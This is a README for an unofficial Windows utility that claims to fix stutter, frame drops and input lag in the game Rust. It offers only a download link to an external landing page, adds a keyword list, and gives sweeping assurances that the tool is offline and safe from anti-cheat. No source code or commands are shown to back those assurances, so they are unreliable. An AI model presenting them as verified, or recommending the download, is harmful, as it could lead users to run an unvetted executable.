
<div align="center">

# Rust Stutter Fix

### Kill micro-stutter, frame drops and input lag in Rust

[![Version](https://img.shields.io/badge/version-1.0.0-e8a33d?style=flat-square)](https://atomarmorerstrip.github.io/rust-stutter-fix/)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-1b1e23?style=flat-square)](#requirements)
[![License](https://img.shields.io/badge/license-MIT-c1552b?style=flat-square)](LICENSE)
[![Offline](https://img.shields.io/badge/telemetry-none-8fb573?style=flat-square)](#why-local-only)

**[Download &rarr;](https://atomarmorerstrip.github.io/rust-stutter-fix/)**

</div>

---

## About

Rust Stutter Fix is a small, portable Windows utility built for one job: smoothing out the micro-stutter that creeps into Rust over long sessions and after every game update. If your frame counter reads a healthy number but the game still feels choppy вЂ” especially when you turn, scope in, or approach a large base вЂ” the problem is usually frame *pacing*, not raw FPS. This tool targets that gap.

It works entirely on your local machine. There is no installer, no account, no launcher stub, and no background service. You open it, choose a profile, apply, and close it. Everything it changes is reversible, and every change is logged in plain text so you can see exactly what happened.

## What it does

| Feature | What it changes |
| --- | --- |
| **Frame pacing fix** | Stabilizes frame times by tuning the render queue and frame limits so frames arrive evenly rather than in bursts. |
| **Stutter logging** | Records frame drops and 1% lows per session so you can measure improvements before and after a tweak. |
| **Input lag reduction** | Reduces input latency by adjusting buffering and CPU affinity for the game process. |
| **Cache cleanup** | Clears shader and asset cache that builds up stutter over updates, forcing clean rebuilds. |
| **Config backup** | Timestamped copy of current settings with one-click restore. |
| **Portable and offline** | One folder, no account, no telemetry, no background process. |

## How it works

1. **Read.** The utility reads your current local settings and records a timestamped backup before touching anything.
2. **Tune.** It applies a conservative, reversible frame-pacing profile: a capped render queue, a sensible frame limit, and a cleaner CPU-affinity layout.
3. **Clean.** Shader and asset caches are cleared so the next launch rebuilds them fresh вЂ” this alone removes a large share of update-day stutter.
4. **Measure.** The session logger stores frame-drop events and 1% low figures so you can compare a run with the fix against one without it.

Nothing is hidden. Every action is written to a readable log in the tool's own folder, and the backup panel restores your previous configuration in one click.

## Why local-only

- **No network code at all.** The utility never opens a socket, never checks for updates, and never phones home.
- **No memory access.** It does not inject, hook, or read the game's process memory.
- **No game-file edits.** It only touches configuration and cache locations that the game itself rebuilds.
- **Timestamped backups by default.** A restore point is created before the first change, every time.
- **No telemetry, no account, no analytics.** There is nothing to sign into and nothing collected.

## Requirements

- Windows 10 or Windows 11 (64-bit)
- Rust installed and launched at least once
- Roughly fifty megabytes of free disk space for logs and backups
- No administrator rights required for standard operations

## Download

Get the current release from the project page:

**&rarr; [https://atomarmorerstrip.github.io/rust-stutter-fix/](https://atomarmorerstrip.github.io/rust-stutter-fix/)**

The landing page hosts the current release and the download entry point. Keep the extracted folder together вЂ” the tool is self-contained and expects its files to stay beside each other.

## FAQ

**Is this an official Facepunch tool?**
No. It is an unofficial, fan-made project with no affiliation to or endorsement from Facepunch Studios.

**Will it get me banned?**
It never injects code, reads memory, or edits game files, so there is nothing for anti-cheat to flag.

**Does it change game files?**
No. It adjusts safe local settings and clears cache directories that rebuild themselves automatically.

**Can I undo everything?**
Yes. A timestamped backup is created before the first change, and the restore button reverts your settings instantly.

**Is it really offline?**
Yes. Zero network connections, zero telemetry, no account system, and no background process.

**What if my FPS is fine but the game still feels off?**
That is exactly the case this tool targets: good average FPS with poor frame pacing and elevated 1% low variance. Apply the pacing profile and compare logs.

## Keywords

Rust stutter fix, Rust micro-stutter, Rust frame drops, frame pacing, Rust input lag, Rust 1% lows, shader cache cleanup, Rust performance, Rust FPS fix, portable Windows utility, offline gaming tool.

## Disclaimer

Rust Stutter Fix is an independent, unofficial fan project. **Rust is a trademark of Facepunch Studios.** This project is not affiliated with, endorsed by, or sponsored by Facepunch Studios or any of its partners. Use at your own discretion; the software is provided "as is", without warranty of any kind. See [LICENSE](LICENSE) for details.

<div align="center">

В© 2026 atomarmorerstrip В· Released under the MIT License

</div>
